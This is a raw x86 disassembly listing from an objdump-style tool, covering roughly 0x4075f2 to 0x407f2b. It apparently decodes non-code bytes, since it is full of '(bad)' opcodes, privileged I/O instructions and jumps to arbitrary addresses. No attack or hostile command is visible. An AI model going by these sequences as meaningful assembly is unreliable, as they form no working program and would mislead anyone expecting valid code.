  4075f2:	inc    DWORD PTR [ebx-0x16]
  4075f5:	idiv   bh
  4075f7:	stc    
  4075f8:	in     eax,0x7d
  4075fa:	mov    eax,0xb5feacf9
  4075ff:	out    0xc4,al
  407601:	(bad)  
  407602:	push   DWORD PTR [esi]
  407604:	xor    BYTE PTR [edi+0xff],dh
	...
  40761a:	add    BYTE PTR [eax],al
  40761c:	cmp    DWORD PTR [esp+esi*4-0x153ce20],ebp
  407623:	call   0x3fecce
  407628:	sub    DWORD PTR [edx-0x28],esi
  40762b:	idiv   ecx
  40762d:	stos   DWORD PTR es:[edi],eax
  40762e:	out    0x5d,eax
  407630:	mov    dh,0xab
  407632:	(bad)  
  407633:	push   DWORD PTR [ebx-0x36000952]
  407639:	out    0x51,al
  40763b:	mov    eax,0x45feabf9
  407640:	mul    ch
  407642:	aam    0xfd
  407644:	fldcw  WORD PTR [ebx-0x19158a02]
  40764a:	fwait
  40764b:	mov    cl,BYTE PTR [esi+0x0]
  40764e:	leave  
  40764f:	ret    0x46
  407652:	push   ebp
  407653:	mov    ebp,DWORD PTR [edx+0x7f]
  407656:	(bad)  
  407657:	cld    
  407658:	xor    al,0x0
  40765a:	push   0xd
  40765c:	mov    ecx,0xa7e80731
  407661:	test   DWORD PTR [eax-0x3f1cf701],edx
  407667:	sti    
  407668:	pop    DWORD PTR [esi+ecx*1]
  40766b:	inc    ecx
  40766c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40766d:	push   esp
  40766e:	rol    BYTE PTR [edi],1
  407670:	dec    esi
  407672:	push   edi
  407673:	(bad)  
  407674:	call   0xe13c46dd
  407679:	mov    dh,0xb
  40767b:	call   0xff96e5a8
	...
  407694:	add    dh,bl
  407696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407697:	(bad)  
  407698:	push   DWORD PTR [ebx-0x20]
  40769b:	sub    bx,0x4e8d
  4076a0:	(bad)  
  4076a1:	mov    eax,0x57fbbfe6
  4076a6:	mov    eax,ss
  4076a8:	or     ebp,DWORD PTR [eax-0x19d72cb2]
  4076ae:	imul   ebp,DWORD PTR [ebx+0x52],0xb03692d
  4076b5:	addr16 pop esp
  4076b7:	sbb    BYTE PTR [edi-0x5b],0x69
  4076bb:	add    eax,edi
  4076bd:	jmp    0x3e69:0xa7000381
  4076c4:	inc    ebp
  4076c5:	jnp    0x407693
  4076c7:	std    
  4076c8:	jmp    FWORD PTR [eax-0x1]
  4076cb:	add    ebp,DWORD PTR [edx-0x59]
  4076ce:	das    
  4076cf:	add    ebp,DWORD PTR [edx-0x59]
  4076d2:	out    0xbf,al
  4076d4:	repz neg esi
  4076d7:	jg     0x4076cd
  4076d9:	push   eax
  4076da:	les    edx,FWORD PTR [ebp+0x50]
  4076dd:	inc    eax
  4076de:	xchg   esi,eax
  4076df:	pop    ebx
  4076e0:	push   DWORD PTR [edx+0x1d246b15]
  4076e6:	imul   eax,DWORD PTR [ebx],0x8d670b
  4076ec:	jmp    0x42b79b6
  4076f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076f2:	jmp    0xd016:0x2662b07
	...
  40770d:	add    BYTE PTR [edx+ebp*2+0x53009aa6],bl
  407714:	jb     0x407749
  407716:	sub    bh,BYTE PTR [ebp-0xb]
  407719:	dec    ebp
  40771a:	lock push edx
  40771c:	cdq    
  40771d:	mov    cl,0x0
  40771f:	xchg   BYTE PTR [edx],dh
  407721:	push   esi
  407722:	loopne 0x4076ac
  407724:	ins    BYTE PTR es:[edi],dx
  407725:	push   esp
  407726:	rcl    BYTE PTR [edx-0x22],1
  407729:	xchg   DWORD PTR [edx],ebp
  40772b:	inc    esi
  40772c:	ficom  WORD PTR [ebp-0x38]
  40772f:	mov    cl,0x40
  407731:	jne    0x4077ab
  407733:	shr    eax,0x54
  407736:	repnz push ecx
  407738:	mov    dh,0x55
  40773a:	mov    al,0x52
  40773c:	cld    
  40773d:	sar    DWORD PTR [edi-0x3f],cl
  407740:	call   0xa6cda8b0
  407745:	push   ebp
  407746:	mov    BYTE PTR cs:[ebp+0x352904d],al
  40774d:	add    al,0xff
  40774f:	xchg   edi,eax
  407750:	(bad)  
  407751:	ret    0x5180
  407754:	cmp    al,0x54
  407756:	jo     0x4077aa
  407758:	jle    0x4077af
  40775a:	mov    edx,0x68c2bfd2
  40775f:	push   0xfffffff9
  407761:	cdq    
  407762:	pusha  
  407763:	push   edx
  407764:	jo     0x4077e5
  407766:	dec    ebx
  407767:	pop    edx
  407768:	pop    esi
  407769:	push   ebp
  40776a:	mov    ebp,0x9099c102
  40776f:	ret    
  407770:	call   0x4077c9
	...
  407785:	add    BYTE PTR [eax],al
  407787:	cli    
  407788:	push   edx
  407789:	ds push ebp
  40778b:	cmp    BYTE PTR [edx-0xc],dl
  40778e:	sar    DWORD PTR [edi-0x3d],cl
  407791:	(bad)  
  407792:	call   0x2efa2c53
  407797:	jp     0x407814
  407799:	test   DWORD PTR [ecx],edx
  40779b:	push   0x51
  40779d:	call   DWORD PTR [ebx-0x213b255c]
  4077a3:	in     eax,0x51
  4077a5:	(bad)  
  4077a6:	push   esp
  4077a7:	pop    ebx
  4077a8:	pop    ecx
  4077a9:	inc    DWORD PTR [esi]
  4077ab:	push   edx
  4077ac:	pop    ss
  4077ad:	jo     0x40777f
  4077af:	in     eax,0x51
  4077b1:	out    0xbd,eax
  4077b3:	push   cs
  4077b4:	push   edx
  4077b5:	jmp    DWORD PTR [eax+0x60]
  4077b8:	(bad)  
  4077b9:	mul    esi
  4077bb:	jae    0x40783c
  4077bd:	test   ecx,eax
  4077bf:	arpl   WORD PTR [ecx-0x1],dx
  4077c2:	cmp    DWORD PTR [ebx-0x54d7c86f],edi
  4077c8:	push   ecx
  4077c9:	mov    ch,0xb9
  4077cb:	imul   edx,DWORD PTR [ecx-0x1],0xffffffbe
  4077cf:	mov    eax,ds:0xa32828d2
  4077d4:	pop    edx
  4077d5:	adc    DWORD PTR [ebx-0x5],esi
  4077d8:	push   ecx
  4077d9:	or     ebp,DWORD PTR [ecx+0x5c82f468]
  4077df:	int3   
  4077e0:	pop    ecx
  4077e1:	call   DWORD PTR [esi-0x71f62978]
  4077e7:	xchg   esp,eax
  4077e8:	add    DWORD PTR [ebp+0xa5],0x0
	...
  4077fe:	add    BYTE PTR [eax],al
  407800:	jmp    0x407853
  407802:	call   DWORD PTR [edx-0x6a7ab662]
  407808:	fist   DWORD PTR [ecx-0x1]
  40780b:	aam    0xa4
  40780d:	add    al,BYTE PTR [eax]
  40780f:	mov    ecx,0x5eb634cc
  407814:	sti    
  407815:	jg     0x40779c
  407817:	cmp    ebx,ebx
  407819:	push   ecx
  40781a:	(bad)  
  40781b:	mov    ecx,0x37a94c
  407820:	syscall 
  407822:	push   DWORD PTR [ebp-0x14192]
  407828:	jno    0x40782a
  40782a:	jo     0x407855
  40782c:	dec    edi
  40782d:	add    eax,0xb687cde8
  407832:	dec    BYTE PTR [ebx]
  407834:	mov    esi,0x73831241
  407839:	adc    eax,0x51b1fff7
  40783e:	je     0x40784a
  407840:	mov    eax,ds:0x9a858ef5
  407845:	mov    esi,0xfba5fffe
  40784a:	mov    BYTE PTR [ebp-0x14146],0xce
  407851:	add    al,0x0
  407853:	add    BYTE PTR [esi-0xe497252],cl
  407859:	mov    ah,0x82
  40785b:	mov    ebp,0xfffeacea
  407860:	into   
  407861:	cmp    BYTE PTR [esi],bh
  407863:	add    DWORD PTR [eax],0x0
	...
  407876:	add    BYTE PTR [eax],al
  407878:	add    BYTE PTR [ebx],dh
  40787a:	or     dh,bh
  40787c:	push   ecx
  40787e:	pop    es
  40787f:	jne    0x4078b7
  407881:	in     al,0x6
  407883:	lea    eax,[ebp-0x153ae]
  407889:	into   
  40788a:	mov    bl,0xb4
  40788c:	in     al,0x29
  40788e:	mov    ah,0xfe
  407890:	call   0x3f98e1
  407895:	jne    0x40785b
  407897:	jae    0x4078a2
  407899:	std    
  40789a:	jno    0x407868
  40789c:	div    ecx
  40789e:	mov    bl,0xff
  4078a0:	je     0x40791d
  4078a2:	mov    ch,0xb4
  4078a4:	in     al,0xf9
  4078a6:	mov    bl,0xfe
  4078a8:	call   0x3fe2bb
  4078ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078ae:	and    BYTE PTR [ecx+0x52c138e4],cl
  4078b4:	add    BYTE PTR [edi-0xd7cfca7],ah
  4078ba:	lds    ebx,FWORD PTR [edx-0x1]
  4078bd:	sub    BYTE PTR [edx-0x29],bl
  4078c0:	push   0x24
  4078c2:	fistp  WORD PTR [edi-0x9]
  4078c5:	sbb    BYTE PTR [ecx],ch
  4078c7:	add    al,0x74
  4078c9:	test   esp,ebx
  4078cb:	nop
  4078cc:	call   0x9371e1
  4078d1:	jnp    0x407865
  4078d3:	fild   DWORD PTR [ecx]
  4078d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078d6:	clc    
  4078d7:	xchg   ecx,eax
  4078d8:	(bad)  
  4078d9:	jp     0x40792c
  4078db:	pop    ebx
  4078dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  4078f1:	add    BYTE PTR ds:0x1aff5259,dh
  4078f7:	dec    esi
  4078f8:	pop    edx
  4078f9:	(bad)  
  4078fa:	fsubr  DWORD PTR [eax-0x28]
  4078fd:	pop    es
  4078fe:	mov    edi,0xc8ff9564
  407903:	cmp    BYTE PTR [eax+0x5240b8e8],bl
  407909:	push   DWORD PTR [edx]
  40790b:	push   ecx
  40790c:	pop    ebx
  40790d:	in     eax,dx
  40790e:	cmc    
  40790f:	nop
  407910:	push   edx
  407911:	push   edx
  407913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407914:	pop    edx
  407915:	jmp    DWORD PTR [eax-0x6f1b6760]
  40791b:	test   al,0x52
  40791d:	call   FWORD PTR [edx]
  40791f:	push   edx
  407920:	pop    ebx
  407921:	lods   eax,DWORD PTR ds:[esi]
  407922:	push   ebp
  407923:	js     0x407977
  407925:	(bad)  
  407926:	cmp    bl,BYTE PTR [ebp-0x778700a6]
  40792c:	fadd   DWORD PTR [edi]
  40792e:	jg     0x407922
  407930:	xchg   ebp,eax
  407931:	jmp    FWORD PTR [eax-0x28]
  407934:	xchg   edi,eax
  407935:	loopne 0x40798f
  407937:	loopne 0x40798a
  407939:	call   edx
  40793b:	add    dh,cl
  40793d:	pop    ebx
  40793e:	adc    dl,BYTE PTR [esi+ebx*2+0x4d954852]
  407945:	pop    edx
  407946:	inc    eax
  407947:	dec    edi
  407948:	inc    ecx
  407949:	dec    edx
  40794a:	repnz dec esi
  40794c:	inc    esi
  40794d:	push   edx
  40794e:	cli    
  40794f:	pop    ebp
  407950:	ss push edx
  407952:	sub    BYTE PTR [edx+0x75],bl
  407955:	cwde   
	...
  40796a:	add    BYTE PTR [eax],ah
  40796c:	dec    edi
  40796d:	cs cwde 
  40796f:	xorps  xmm4,XMMWORD PTR [esi]
  407972:	push   edx
  407973:	call   DWORD PTR [eax+0x4f085254]
  407979:	pop    esp
  40797a:	arpl   ax,di
  40797c:	dec    esi
  40797d:	push   cs
  40797e:	pop    ebx
  40797f:	inc    ecx
  407980:	xchg   ebp,eax
  407981:	push   es
  407982:	push   edx
  407983:	lock xchg esp,eax
  407985:	stc    
  407986:	pop    ecx
  407987:	call   0x1aae7ada
  40798c:	dec    edi
  40798d:	out    dx,al
  40798e:	push   ecx
  40798f:	bound  ecx,QWORD PTR [edx-0x30]
  407992:	xchg   esp,eax
  407993:	ror    BYTE PTR [esi-0x22],cl
  407996:	push   ecx
  407997:	push   edx
  407998:	dec    esi
  407999:	shl    DWORD PTR [edi+0x28],0x2
  40799d:	jmp    0xe93a5edc
  4079a2:	mov    dh,0x1d
  4079a4:	pop    esi
  4079a5:	push   0x48
  4079a7:	mov    bl,0xdb
  4079a9:	call   0x348e2c8b
  4079ae:	cld    
  4079af:	and    BYTE PTR [eax+0x7c90515b],0x24
  4079b6:	push   eax
  4079b7:	inc    DWORD PTR [edx]
  4079b9:	jmp    0xc81bbb1e
  4079be:	sbb    dh,ah
  4079c0:	add    dl,BYTE PTR [ecx]
  4079c2:	and    bh,BYTE PTR [eax-0xdaf173d]
  4079c8:	cli    
  4079c9:	inc    DWORD PTR [eax+0x6eff2c78]
	...
  4079e3:	add    al,bl
  4079e5:	(bad)  
  4079e6:	idiv   DWORD PTR [ecx-0x57c92994]
  4079ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ed:	fidivr DWORD PTR [ebx]
  4079ef:	push   ds
  4079f0:	fs dec esi
  4079f2:	(bad)  
  4079f3:	adc    al,0x53
  4079f5:	sbb    eax,DWORD PTR [ecx-0x17]
  4079f8:	int3   
  4079f9:	test   al,0xb7
  4079fb:	ds (bad) 
  4079fd:	stc    
  4079fe:	mov    edi,0x457bcebd
  407a03:	xor    eax,0x160002fb
  407a08:	xor    eax,0x6cf1754e
  407a0d:	xchg   ebp,eax
  407a0e:	mov    cl,0x16
  407a10:	push   esi
  407a11:	dec    ebp
  407a12:	jne    0x407a25
  407a14:	push   esi
  407a15:	xlat   BYTE PTR ds:[ebx]
  407a16:	repz push es
  407a18:	fadd   DWORD PTR ds:0x4e141ee8
  407a1e:	push   esi
  407a20:	stc    
  407a21:	push   ecx
  407a22:	call   0xff8eabf8
  407a27:	push   ecx
  407a28:	sub    edx,DWORD PTR [esi]
  407a2a:	inc    ecx
  407a2b:	jmp    0xc14851a7
  407a30:	push   esi
  407a31:	dec    esi
  407a32:	dec    esi
  407a34:	push   edi
  407a35:	xlat   BYTE PTR ds:[ebx]
  407a36:	sti    
  407a37:	(bad)  
  407a38:	fld    DWORD PTR ds:0x4e113fe8
  407a3e:	jmp    DWORD PTR [eax+0x140006ea]
  407a44:	sbb    bl,BYTE PTR [edi-0x7d]
  407a47:	lods   eax,DWORD PTR ds:[esi]
	...
  407a5c:	add    al,ah
  407a5e:	fdivr  st,st(7)
  407a60:	adc    ah,BYTE PTR [esi-0x231e8ab3]
  407a66:	and    BYTE PTR [edx+0x457bd78e],dh
  407a6c:	add    BYTE PTR [edx],ch
  407a6e:	sub    edi,edi
  407a70:	call   FWORD PTR [ecx]
  407a72:	jae    0x407adc
  407a74:	shl    DWORD PTR [ecx],1
  407a76:	inc    eax
  407a77:	jmp    DWORD PTR [edi+0x2b]
  407a7a:	jmp    0xe807:0x34c90040
  407a81:	hlt    
  407a82:	sbb    bh,bh
  407a84:	(bad)  
  407a85:	fnstenv [ebx+edi*8]
  407a88:	call   DWORD PTR [ebx+0x49]
  407a8b:	out    0x43,eax
  407a8d:	lods   al,BYTE PTR ds:[esi]
  407a8e:	mov    dl,0xfe
  407a90:	leave  
  407a91:	jl     0x407a98
  407a93:	add    BYTE PTR [ebp-0x7b],dl
  407a96:	lods   eax,DWORD PTR ds:[esi]
  407a97:	add    ah,0xca
  407a9a:	das    
  407a9b:	jmp    FWORD PTR [ecx+0xe]
  407a9e:	mov    dl,0x74
  407aa0:	or     BYTE PTR [esi-0x66004f26],dh
  407aa6:	enter  0xfc44,0x26
  407aaa:	add    DWORD PTR [eax],eax
  407aac:	out    dx,eax
  407aad:	push   0x3f37e629
  407ab2:	add    DWORD PTR [eax-0x14],ebp
  407ab5:	and    DWORD PTR [eax-0x1],eax
  407ab8:	(bad)  
  407ab9:	push   ebx
  407aba:	dec    ecx
  407abb:	out    0xaf,eax
  407abd:	out    0xbc,eax
  407abf:	(bad)  
  407ac0:	push   0x0
	...
  407ad6:	mov    esi,0x8f382828
  407adb:	push   es
  407adc:	push   0xff47960f
  407ae1:	(bad)  
  407ae2:	mov    bl,0x30
  407ae4:	sub    BYTE PTR [ecx-0x42],al
  407ae7:	test   al,0x95
  407ae9:	mov    bh,0x59
  407aeb:	mov    esp,0x1ad2c00a
  407af0:	push   0xff478605
  407af5:	dec    edi
  407af6:	ss popa 
  407af8:	mov    bh,0xff
  407afa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407afb:	je     0x407ab1
  407afd:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  407aff:	pop    ecx
  407b00:	pop    esi
  407b01:	mov    esi,0x41177cff
  407b06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b07:	jmp    0x81eff05a
  407b0c:	sbb    bl,cl
  407b0e:	pop    eax
  407b0f:	fstp   QWORD PTR [ebx+0x56]
  407b12:	sbb    esp,ebp
  407b14:	dec    esi
  407b15:	call   edx
  407b17:	lods   eax,DWORD PTR ds:[esi]
  407b18:	dec    esi
  407b19:	jne    0x407aca
  407b1b:	sar    DWORD PTR [ecx+esi*4],0x38
  407b1f:	mov    ebp,0x59abc23c
  407b24:	mov    eax,0x47d93b8a
  407b29:	cld    
  407b2a:	jns    0x407b98
  407b2c:	fcos   
  407b2e:	mov    gs,WORD PTR [edx]
  407b30:	dec    esi
  407b31:	jne    0x407ad2
  407b33:	icebp  
  407b34:	fidiv  DWORD PTR [eax+0x457ced08]
	...
  407b4e:	add    BYTE PTR [ebx],al
  407b50:	loope  0x407b6a
  407b52:	mov    edi,ecx
  407b54:	call   0x411b:0xd6b28b03
  407b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b5c:	(bad)  [esi]
  407b5e:	add    BYTE PTR [ebx-0x60],bl
  407b61:	(bad)  [edi+ebx*4]
  407b64:	call   0x85:0x69bf5703
  407b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b6c:	push   eax
  407b6d:	inc    ebx
  407b6e:	je     0x407afa
  407b70:	or     ebx,DWORD PTR [ebx+edx*8-0x6]
  407b74:	cmp    al,0x4e
  407b76:	push   0xffc50171
  407b7b:	pop    eax
  407b7c:	xor    DWORD PTR [ecx-0x49],edx
  407b7f:	mov    al,ds:0xa767b394
  407b84:	pop    ecx
  407b85:	pop    esi
  407b86:	mov    esi,0xd8a602f7
  407b8b:	mov    al,ds:0x8038c35a
  407b90:	dec    ebx
  407b91:	sbb    DWORD PTR [edx+0x34],0xa65a8e4b
  407b98:	les    ebp,FWORD PTR [eax+0xd]
  407b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b9c:	aad    0x82
  407b9e:	lds    ebx,FWORD PTR [edi+ecx*1-0x57]
  407ba2:	mov    WORD PTR [eax+0x4b],ds
  407ba5:	outs   dx,BYTE PTR ds:[esi]
  407ba6:	dec    esi
  407ba7:	push   ebp
  407ba8:	pushf  
  407ba9:	and    DWORD PTR [edi],eax
  407bab:	rcl    BYTE PTR [ebp+0x4b3cd85e],cl
  407bb1:	fdiv   st(3),st
	...
  407bc7:	add    BYTE PTR [eax-0x3d],al
  407bca:	xchg   edi,eax
  407bcb:	dec    esi
  407bcc:	xor    BYTE PTR [ebx+0x6653ca6],ch
  407bd2:	jmp    0x6a9ea98f
  407bd7:	inc    edi
  407bd8:	sbb    ebx,eax
  407bda:	call   0x9c8c32b8
  407bdf:	sti    
  407be0:	add    BYTE PTR [ecx+0x59],bl
  407be3:	dec    esi
  407be4:	add    BYTE PTR [ecx-0x54],bh
  407be7:	dec    edi
  407be8:	pop    DWORD PTR [edx]
  407bea:	jmp    0x9b1aad4d
  407bef:	or     esp,DWORD PTR [esi+0x2]
  407bf2:	xchg   ecx,eax
  407bf3:	mov    esp,0x4ee8c198
  407bf8:	push   edx
  407bf9:	cli    
  407bfa:	add    BYTE PTR [edi+ebp*8+0x524de64a],dl
  407c01:	dec    esi
  407c02:	(bad)  
  407c04:	test   al,0x5a
  407c06:	jecxz  0x407b9a
  407c08:	mov    eax,0xab42a04a
  407c0d:	add    bl,BYTE PTR [ecx+edi*2]
  407c10:	mov    ebx,0x9830a580
  407c15:	dec    edx
  407c16:	add    BYTE PTR [esi+0x19fbc018],dh
  407c1c:	loop   0x407bed
  407c1e:	or     esp,DWORD PTR [esi+0x2828d2b0]
  407c24:	stos   DWORD PTR es:[edi],eax
  407c25:	pop    edx
  407c26:	int    0x6c
  407c28:	mov    ds:0xa90b02,eax
	...
  407c41:	jb     0x407cc2
  407c43:	mov    eax,ds:0xc702a4e8
  407c48:	and    al,0xf3
  407c4a:	add    al,BYTE PTR [eax]
  407c4c:	jmp    0x7585bdf5
  407c51:	loop   0x407c54
  407c53:	add    cl,ch
  407c55:	outs   dx,BYTE PTR ds:[esi]
  407c56:	dec    edx
  407c57:	imul   ebp,ecx,0xe9694a5e
  407c5d:	mov    ecx,0xb1b9f3bf
  407c62:	jg     0x407c58
  407c64:	fimul  DWORD PTR ds:[ecx+0x50]
  407c68:	ds clc 
  407c6a:	push   ecx
  407c6b:	(bad)  
  407c6c:	mov    esp,0x649f5a68
  407c71:	stos   DWORD PTR es:[edi],eax
  407c72:	add    cl,BYTE PTR [ebx]
  407c74:	sub    edi,ebp
  407c76:	(bad)  
  407c77:	call   0x432201
  407c7c:	add    DWORD PTR [ebp+0x63e9411a],0x65110bcf
  407c86:	nop
  407c87:	(bad)  
  407c88:	(bad)  
  407c89:	adc    al,0x7d
  407c8b:	shl    BYTE PTR [eax+eiz*1+0x4f],1
  407c8f:	imul   esi
  407c91:	arpl   WORD PTR [edx-0x6ec92eaf],si
  407c97:	(bad)  
  407c98:	fidivr WORD PTR ds:0x6bdef07f
  407c9e:	dec    ecx
  407c9f:	call   0xff8a9485
	...
  407cb8:	add    BYTE PTR [eax],al
  407cba:	push   esp
  407cbb:	(bad)  
  407cbc:	outs   dx,DWORD PTR ds:[si]
  407cbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cbf:	inc    ebp
  407cc0:	(bad)  
  407cc1:	(bad)  
  407cc2:	sbb    esi,DWORD PTR [esi-0x49be000a]
  407cc8:	xor    al,0x70
  407cca:	ja     0x407d10
  407ccc:	jmp    edi
  407cce:	jbe    0x407d3f
  407cd0:	(bad)  
  407cd1:	inc    DWORD PTR [edi]
  407cd3:	and    esp,0x69b621f7
  407cd9:	add    BYTE PTR [esi+0x4e413797],dl
  407cdf:	mov    dh,0xb4
  407ce1:	lock fnstenv [esi+0x351bfffe]
  407ce8:	sub    BYTE PTR [ecx+0x3e],al
  407ceb:	lods   eax,DWORD PTR ds:[esi]
  407cec:	jmp    0x88f75ea6
  407cf1:	test   edx,esp
  407cf3:	scas   al,BYTE PTR es:[edi]
  407cf4:	(bad)  
  407cf5:	jmp    DWORD PTR [ebp+eax*1+0x68]
  407cf9:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfb:	inc    ebp
  407cfc:	(bad)  
  407cfd:	(bad)  
  407cfe:	fwait
  407cff:	mov    ch,0xf6
  407d01:	call   ecx
  407d03:	mov    dh,0x34
  407d05:	jo     0x407cae
  407d07:	inc    ebp
  407d08:	jmp    edi
  407d0a:	shl    BYTE PTR [eax-0x1],cl
  407d0d:	push   DWORD PTR [edi-0x80]
  407d10:	call   0x8cf70f0c
  407d15:	test   edx,eax
  407d17:	scas   al,BYTE PTR es:[edi]
  407d18:	(bad)  
  407d19:	dec    DWORD PTR [esi]
  407d1b:	sub    eax,0x3877
	...
  407d30:	add    BYTE PTR [eax],al
  407d32:	add    BYTE PTR [edi],cl
  407d34:	add    eax,0xb4deb5ff
  407d39:	(bad)  
  407d3a:	inc    ecx
  407d3c:	out    dx,al
  407d3d:	outs   dx,DWORD PTR ds:[esi]
  407d3e:	sub    DWORD PTR [edi-0x2],edi
  407d41:	out    0xa9,eax
  407d43:	sbb    edi,DWORD PTR [ebp-0x6458f402]
  407d49:	rcr    BYTE PTR [eax],1
  407d4b:	and    al,0x76
  407d4d:	sub    bh,dh
  407d4f:	test   al,0x3f
  407d51:	add    BYTE PTR [ebp-0x49],dh
  407d54:	mov    BYTE PTR [edi+ecx*4],dl
  407d57:	and    bh,BYTE PTR [edx]
  407d59:	push   ebx
  407d5a:	call   DWORD PTR [eax+0x55765bea]
  407d60:	mov    eax,ds:0x549beb4b
  407d65:	inc    ebx
  407d66:	je     0x407d09
  407d68:	or     DWORD PTR [edx+ebp*2+0x35],ebx
  407d6c:	jns    0x407db9
  407d6e:	(bad)  
  407d6f:	and    bh,BYTE PTR [edx+0x53]
  407d72:	jmp    DWORD PTR [eax+0x2f]
  407d75:	add    eax,DWORD PTR [eax]
  407d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d78:	fmul   QWORD PTR [eax+0x4ad958e4]
  407d7e:	add    bl,dl
  407d80:	mov    BYTE PTR [esi+0x4ab153bd],al
  407d86:	jmp    DWORD PTR [edi-0xd7d46db]
  407d8c:	rcl    DWORD PTR [edx-0x1],0x28
  407d90:	pop    edx
  407d91:	iret   
  407d92:	inc    esp
  407d93:	(bad)  
  407d94:	pop    ecx
  407d95:	add    ebp,edi
	...
  407dab:	add    BYTE PTR [ecx+0x11],bl
  407dae:	rol    DWORD PTR [edi],1
  407db0:	call   FWORD PTR [edx]
  407db2:	call   0xf8ec:0x912108ff
  407db9:	call   0x61b37d08
  407dbe:	pop    ebx
  407dbf:	adc    eax,0xff4af940
  407dc4:	xor    dh,dl
  407dc6:	push   edx
  407dc7:	jmp    eax
  407dc9:	dec    eax
  407dca:	rol    BYTE PTR [edi],1
  407dcc:	iret   
  407dcd:	pop    eax
  407dce:	call   0xd0e4:0x9058d0ff
  407dd5:	add    ah,dh
  407dd7:	dec    edx
  407dd8:	ror    ch,0xf0
  407ddb:	pop    ebx
  407ddc:	mov    esi,0xb04ad698
  407de1:	(bad)  
  407de2:	leave  
  407de3:	push   edx
  407de4:	test   al,0x47
  407de6:	(bad)  
  407de7:	shr    BYTE PTR [eax-0x67668fa6],1
  407ded:	inc    edi
  407dee:	mov    dh,0x90
  407df0:	mov    ecx,DWORD PTR [edi-0x52]
  407df3:	dec    edx
  407df4:	jg     0x407e43
  407df6:	pop    eax
  407df7:	dec    edx
  407df8:	add    BYTE PTR [edi+0x54],0x57
  407dfc:	jo     0x407e45
  407dfe:	xchg   esi,eax
  407dff:	pop    ebx
  407e00:	jge    0x407d93
  407e02:	mov    cs,WORD PTR [edx+0x68]
  407e05:	lea    edx,[ecx-0x6eb89fae]
  407e0b:	sub    dl,BYTE PTR [esi]
  407e0d:	inc    edi
  407e0e:	jbe    0x407e5a
	...
  407e24:	add    BYTE PTR [edx],bl
  407e26:	push   edx
  407e27:	jbe    0x407e73
  407e29:	dec    eax
  407e2a:	pop    edx
  407e2b:	cmp    eax,0x5e474094
  407e30:	shl    BYTE PTR [eax],0x59
  407e33:	(bad)  
  407e34:	dec    ecx
  407e35:	xor    BYTE PTR [edi+0x4e],al
  407e38:	shr    BYTE PTR [edx+ebx*2],1
  407e3b:	out    0x7f,eax
  407e3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e3e:	add    dh,BYTE PTR [eax]
  407e40:	inc    ebp
  407e41:	scas   eax,DWORD PTR es:[edi]
  407e42:	add    bl,BYTE PTR [esi+edi*2+0x47258303]
  407e49:	jge    0x407e4d
  407e4b:	xchg   ebx,eax
  407e4c:	test   BYTE PTR [ecx],0xcd
  407e4f:	lock pop ebx
  407e51:	add    DWORD PTR [eax-0x42e1b5ea],ebx
  407e57:	or     al,0xdb
  407e59:	push   0xe003a80a
  407e5e:	int3   
  407e5f:	lock pop ebx
  407e61:	mov    cl,0x48
  407e63:	add    dh,dh
  407e65:	pop    esi
  407e66:	inc    edi
  407e67:	jne    0x407e56
  407e69:	pop    esi
  407e6a:	int    0x7
  407e6c:	shl    DWORD PTR [edi+edx*4+0x447cdeff],1
  407e73:	add    al,0xe9
  407e75:	add    DWORD PTR [esp+ebp*8+0x6a],edi
  407e79:	addr16 inc esi
  407e7b:	push   0xffffffe9
  407e7d:	xor    dl,0xfe
  407e80:	xor    al,0x9b
  407e82:	pop    esi
  407e83:	mov    ch,0x87
  407e85:	fiadd  WORD PTR [ebp-0x77]
  407e88:	and    al,0x0
	...
  407e9e:	(bad)  
  407ea0:	(bad)  
  407ea1:	call   0x53a90385
  407ea6:	stos   DWORD PTR es:[edi],eax
  407ea7:	ret    
  407ea8:	inc    DWORD PTR [eax]
  407eaa:	dec    ebx
  407eab:	or     eax,DWORD PTR [ecx-0x17]
  407eae:	(bad)  
  407eb0:	pop    es
  407eb1:	xchg   ecx,eax
  407eb2:	push   0xee7eff30
  407eb7:	iret   
  407eb8:	sti    
  407eb9:	jbe    0x407f1b
  407ebb:	(bad)  
  407ebc:	out    0x97,eax
  407ebe:	sub    eax,0xe930ff46
  407ec3:	(bad)  
  407ec4:	push   DWORD PTR [ebx+0x2d8156bb]
  407eca:	or     DWORD PTR [ebp-0x1],0x4e
  407ece:	mov    al,0xbf
  407ed0:	sti    
  407ed1:	cdq    
  407ed2:	outs   dx,DWORD PTR ds:[esi]
  407ed3:	iret   
  407ed4:	or     edi,DWORD PTR [esi]
  407ed6:	test   al,0xd2
  407ed8:	sub    BYTE PTR [eax+0x6a995aa4],ch
  407ede:	mov    ds:0xfe290b02,eax
  407ee3:	jle    0x407eb2
  407ee5:	call   0xad07818e
  407eea:	pop    esp
  407eeb:	add    al,BYTE PTR [eax]
  407eed:	jmp    0x85bc96
  407ef2:	loop   0x407eae
  407ef4:	push   es
  407ef5:	add    dh,cl
  407ef7:	daa    
  407ef8:	jmp    FWORD PTR [ecx-0x42]
  407efb:	daa    
  407efc:	jmp    FWORD PTR [ecx-0x42]
  407eff:	int3   
  407f00:	inc    esp
  407f01:	hlt    
	...
  407f16:	add    BYTE PTR [esi-0x33],bh
  407f19:	test   ah,dh
  407f1b:	sar    DWORD PTR [edx+0x34d950fe],1
  407f21:	idiv   edi
  407f23:	push   ebx
  407f24:	mov    edx,0x20d6be7
  407f29:	add    BYTE PTR [ebx],cl
  407f2b:	dec    esi
